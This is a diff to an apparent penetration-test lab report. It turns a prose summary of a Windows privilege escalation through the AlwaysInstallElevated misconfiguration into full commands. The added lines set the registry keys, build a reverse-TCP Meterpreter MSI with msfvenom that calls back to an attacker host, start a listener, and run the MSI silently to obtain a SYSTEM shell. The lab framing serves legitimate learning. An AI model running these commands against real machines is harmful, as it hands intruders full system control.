@@ -12,9 +12,72 @@ The `AlwaysInstallElevated` policy was enabled in both the `HKEY_LOCAL_MACHINE` 
 
 Local privilege escalation via `AlwaysInstallElevated` misconfiguration (MITRE ATT&CK T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control).
 
-## Execution Summary
+## Attack Execution
 
-Using the low-privilege session obtained during Initial Access, a malicious Windows Installer (`.msi`) package was generated on the Kali attacker platform and transferred to the workstation. The package was executed via the standard Windows Installer command-line utility (`msiexec`). Because `AlwaysInstallElevated` was enabled, the installer executed with SYSTEM-level privileges rather than the invoking user's standard privileges.
+### Step 1 — Confirm Starting Privilege Level (Meterpreter, low-priv session)
+
+```
+meterpreter > getuid
+Server username: LAB\pparker
+
+meterpreter > getprivs
+```
+
+### Step 2 — Plant the Misconfiguration (Windows 11, one-time lab setup, elevated PowerShell)
+
+```powershell
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+```
+
+Verified:
+
+```powershell
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Both returned `0x1`.
+
+### Step 3 — Generate Malicious MSI (Kali)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[INSERT KALI IP] LPORT=4445 -f msi -o evil.msi
+```
+
+### Step 4 — Second Listener (Kali)
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [INSERT KALI IP]
+set LPORT 4445
+run
+```
+
+### Step 5 — Upload and Execute via the Low-Privilege Session
+
+```
+meterpreter > upload evil.msi C:\\Windows\\Temp\\evil.msi
+meterpreter > shell
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
+```
+
+Because `AlwaysInstallElevated` was enabled, the installer executed with SYSTEM-level privileges rather than the invoking user's standard privileges.
+
+### Step 6 — Confirm Escalation (Kali)
+
+```
+[*] Meterpreter session 2 opened
+
+meterpreter > sessions -i 2
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > sysinfo
+Architecture : x64
+```
 
 ## Result
 
@@ -25,8 +88,6 @@ A new session was established running as `NT AUTHORITY\SYSTEM` on the Windows 11
 [`evidence/initial-access2.png`](../evidence/intial-access2.png)
 
 [`evidence/privilege-escalation.png`](../evidence/privilege-escalation.png)
-
-
 
 ## Security Impact
 
